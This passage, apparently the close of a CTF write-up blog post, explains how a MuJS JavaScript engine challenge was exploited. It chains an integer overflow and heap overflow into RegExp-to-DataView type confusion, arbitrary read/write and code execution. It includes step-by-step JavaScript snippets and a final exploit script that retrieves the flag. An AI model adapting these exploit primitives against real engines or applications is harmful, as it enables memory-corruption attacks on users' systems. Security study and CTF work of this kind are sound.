+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">vicitm</span> <span class="o">=</span> <span class="nb">RegExp</span><span class="p">(</span><span class="dl">'</span><span class="s1">/AAAA/ig</span><span class="dl">'</span><span class="p">);</span>
+<span class="c1">// insert code to change victim type here</span>
+<span class="c1">// use the setUint8 function from dataview</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su8</span> <span class="o">=</span> <span class="nb">DataView</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">;</span>
+<span class="c1">// write 0xff 0x30 bytes after the 'AAAA' string</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su8</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">DataView.prototype.setUint8</code> has a check to ensure the object calling it is a DataView, but if we change the type using our overflow, we can <em>confuse</em> <code class="highlighter-rouge">setUint8</code>!</p>
+
+<p><img src="https://i.imgur.com/g6BerGx.png" alt="" /></p>
+
+<p><em>RegExp tricks <code class="highlighter-rouge">setUint8</code> into believing it’s a DataView through type confusion</em></p>
+
+<p>By the way, the heap grows from higher addresses to lower addresses like the stack does with the included memory allocator, so <code class="highlighter-rouge">victim</code> would be at a lower address than the <code class="highlighter-rouge">.join</code> result, meaning we can overflow <code class="highlighter-rouge">victim</code>’s type.</p>
+
+<p>Since we can set any value in this “array”, we have an out of bounds read and write. It’s not perfect though, because we can’t read and write anywhere in memory just yet. Though, and out of bounds write is a significantly more powerful primitive than a heap overflow and will allow use to setup for a arbitrary read and write.</p>
+
+<h3 id="oob-to-arbitrary-rw">OOB to Arbitrary R/W</h3>
+
+<p>If we allocate a DataView right after the RegExp <code class="highlighter-rouge">source</code> string, we can overwrite properties of the DataView. The main property we want to overwrite is <code class="highlighter-rouge">data</code>, since that’ll contain a pointer to the C-like array. We can use the RegExp to move the C-like array pointer in the adjacent DataView and make it point to wherever we want! From there, we can use the DataView with the changed pointer to do read and writes.</p>
+
+<p>So, the RegExp object will use the OOB to overwrite the DataView pointer, while the DataView will actually read and write to the pointer. The RegExp object tells the DataView object <em>where</em> to go, while the DataView object does the actual read/write.</p>
+
+<p><img src="https://i.imgur.com/xqP7lWE.png" alt="" /></p>
+
+<p><em>RegExp controlling where DataView goes, while DataView does the work.</em></p>
+
+<p>Hopefully you’ve got that hammered into your head now, but if not, here’s an example!</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">worker</span> <span class="o">=</span> <span class="nb">DataView</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+<span class="c1">// make source string long enough so that it gets allocated above worker</span>
+<span class="kd">let</span> <span class="nx">vicitm</span> <span class="o">=</span> <span class="nb">RegExp</span><span class="p">(</span><span class="dl">'</span><span class="s1">/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/ig</span><span class="dl">'</span><span class="p">);</span>
+<span class="c1">// insert code to change victim type here</span>
+<span class="c1">// use the setUint32 function from dataview</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span> <span class="o">=</span> <span class="nb">DataView</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">;</span>
+
+<span class="c1">// write lower 32 bits to the data ptr of worker</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span><span class="p">(</span><span class="nx">offset_to_worker_data_ptr</span><span class="p">,</span> <span class="mh">0xdeadbeef</span> <span class="o">%</span> <span class="mh">0x100000000</span><span class="p">);</span>
+<span class="c1">// write upper 32 bits to the data ptr of worker</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span><span class="p">(</span><span class="nx">offset_to_worker_data_ptr</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0xdeadbeef</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">);</span>
+
+<span class="c1">// read 32 bits from 0xdeadbeef, segfault!</span>
+<span class="nx">worker</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Now that we have arbitrary read and write, we need to get arbitrary code execution.</p>
+
+<h3 id="arbitrary-rw-to-ace">Arbitrary R/W to ACE</h3>
+
+<p>Now that we have arbitrary read and write, the heap is our oyster. Getting code execution is fairly easy from here! We just need to do a little more type confusion. For my implementation of ACE, I changed the type of a regular object to that of a CFunction, a type for built in C functions for JS. Ok, ok, you technically don’t need arbitrary read and write to pull this off. In fact, the out of bounds of write is plenty to change the type of the regular object and write the address of the function to be executed. Here’s my code to do this.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">bad_fn</span> <span class="o">=</span> <span class="p">{};</span>
+<span class="kd">let</span> <span class="nx">worker</span> <span class="o">=</span> <span class="nb">DataView</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+<span class="c1">// make source string long enough so that it gets allocated above worker</span>
+<span class="kd">let</span> <span class="nx">vicitm</span> <span class="o">=</span> <span class="nb">RegExp</span><span class="p">(</span><span class="dl">'</span><span class="s1">/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/ig</span><span class="dl">'</span><span class="p">);</span>
+<span class="c1">// insert code to change victim type here</span>
+<span class="c1">// use the setUint32 function from dataview</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span> <span class="o">=</span> <span class="nb">DataView</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">;</span>
+
+<span class="c1">// write to type of bad_fn to make it a CFunction</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span><span class="p">(</span><span class="nx">offset_to_bad_fn</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
+
+<span class="c1">// write lower 32 bits to the function ptr of CFunction</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span><span class="p">(</span><span class="nx">offset_to_bad_fn</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xdeadbeef</span> <span class="o">%</span> <span class="mh">0x100000000</span><span class="p">);</span>
+<span class="c1">// write higher 32 bits to the function ptr of CFunction</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span><span class="p">(</span><span class="nx">offset_to_bad_fn</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0xdeadbeef</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">);</span>
+
+<span class="c1">// 0xdeadbeef is called. segfault!</span>
+<span class="nx">bad_fn</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>Now we have all three requirements!</p>
+
+<h2 id="recap--final-exploit">Recap &amp; Final Exploit</h2>
+
+<p>The path from an integer overflow to arbitrary code execution was certainly not a straightforward one. Let’s go over how we got here.</p>
+
+<ul>
+  <li>Using the integer overflow, we caused the chunk size to shrink, allowing us to use <code class="highlighter-rouge">strcat</code> to append content to the end of the chunk, giving us a heap overflow.</li>
+  <li>Using the heap overflow, we overwrote the the type variable of a RegExp, converting it into a DataView. Because a pointer occupied the space where the length of the DataView array would usually be, we got an out of bounds write on the regular expression string.</li>
+  <li>Using the out of bounds write, we controlled the pointer of a regular DataView, allowing us to read and write anywhere in memory.</li>
+  <li>Also using the out of bounds write, we overwrite the type of an object, converting it into a CFunction. We also wrote the address of the function we want to execute to the function pointer in the CFunction union.</li>
+</ul>
+
+<p>Ok, enough talking. Let’s see the exploit!</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// as a note, mujs supports only legacy javascript, so somethings aren't as efficient as i'd like them to be.</span>
+<span class="kd">function</span> <span class="nx">read32</span><span class="p">(</span><span class="nx">address</span><span class="p">)</span> <span class="p">{</span>
+  	<span class="c1">// 0x128 is the offset to the worker's data ptr. overwrite the data ptr with the address.</span>
+    <span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span><span class="p">(</span><span class="mh">0x128</span><span class="p">,</span> <span class="nx">address</span> <span class="o">%</span> <span class="mh">0x100000000</span><span class="p">);</span>
+    <span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span><span class="p">(</span><span class="mh">0x128</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">address</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nx">worker</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">write32</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span><span class="p">(</span><span class="mh">0x128</span><span class="p">,</span> <span class="nx">address</span> <span class="o">%</span> <span class="mh">0x100000000</span><span class="p">);</span>
+    <span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span><span class="p">(</span><span class="mh">0x128</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">address</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">);</span>
+    <span class="nx">worker</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">execute</span><span class="p">(</span><span class="nx">address</span><span class="p">)</span> <span class="p">{</span>
+  	<span class="c1">// 0x1a8 is the offset to the bad_fn's function pointer. overwrite it with the address to exec</span>
+    <span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span><span class="p">(</span><span class="mh">0x1a8</span><span class="p">,</span> <span class="nx">address</span> <span class="o">%</span> <span class="mh">0x100000000</span><span class="p">);</span>
+    <span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span><span class="p">(</span><span class="mh">0x1a8</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">address</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">);</span>
+  	<span class="c1">// call the function pointer</span>
+    <span class="nx">bad_fn</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="c1">// this code makes a 0x10000 long string of just Xs.</span>
+<span class="kd">var</span> <span class="nx">overflow</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">X</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">overflow</span> <span class="o">=</span> <span class="nx">overflow</span> <span class="o">+</span> <span class="nx">overflow</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// our heap overflow content to overwrite the type of victim</span>
+<span class="nx">overflow_content</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="dl">"</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x11</span><span class="dl">"</span>
+<span class="kd">var</span> <span class="nx">dv_overwrite</span> <span class="o">=</span> <span class="p">[</span><span class="nx">overflow</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">overflow_content</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">50</span><span class="p">),</span> <span class="nx">overflow_content</span><span class="p">];</span>
+
+<span class="kd">var</span> <span class="nx">bad_fn</span> <span class="o">=</span> <span class="p">{};</span>
+<span class="kd">var</span> <span class="nx">worker</span> <span class="o">=</span> <span class="nb">DataView</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+
+<span class="c1">// make the regular expression string long enough so that it gets allocated under the result of dv_overwrite.join</span>
+<span class="kd">var</span> <span class="nx">victim</span> <span class="o">=</span> <span class="nb">RegExp</span><span class="p">(</span><span class="dl">'</span><span class="s1">/RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR/ig</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="c1">// overwrite victim type</span>
+<span class="nx">dv_overwrite</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
+<span class="c1">// give victim dataview functions</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su32</span> <span class="o">=</span> <span class="nb">DataView</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">;</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su8</span> <span class="o">=</span> <span class="nb">DataView</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">;</span>
+
+<span class="nx">write32</span><span class="p">(</span><span class="nx">Challenge</span><span class="p">.</span><span class="nx">write</span><span class="p">(),</span> <span class="nx">read32</span><span class="p">(</span><span class="nx">Challenge</span><span class="p">.</span><span class="nx">read</span><span class="p">()));</span>
+
+<span class="c1">// overwrite the type of bad_fn to make it a CFunction</span>
+<span class="nx">victim</span><span class="p">.</span><span class="nx">su8</span><span class="p">(</span><span class="mh">0x180</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
+
+<span class="c1">// call the code to fetch the flag</span>
+<span class="nx">execute</span><span class="p">(</span><span class="nx">Challenge</span><span class="p">.</span><span class="nx">exec</span><span class="p">());</span>
+
+<span class="c1">// get the flag!</span>
+<span class="kd">var</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">Challenge</span><span class="p">.</span><span class="nx">getFlag</span><span class="p">();</span>
+<span class="nx">print</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Thanks for reading!</p>
+
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Attacking+MuJS:+Breaking+a+JS+engine+with+type+confusion+and+an+integer+overflow.%20-%20https://blog.pepsipu.com/posts/mujs-uiuctf" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://blog.pepsipu.com/posts/mujs-uiuctf" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    sponsored by subpar blue: terrorizing tcaches since 2017
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-XQXDK9JQPD"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-XQXDK9JQPD');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-3ee2c63bbac916f96cd7f90e83ab767f058ead1301444c9966f5156911c8be7f.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+</body>
+</html>
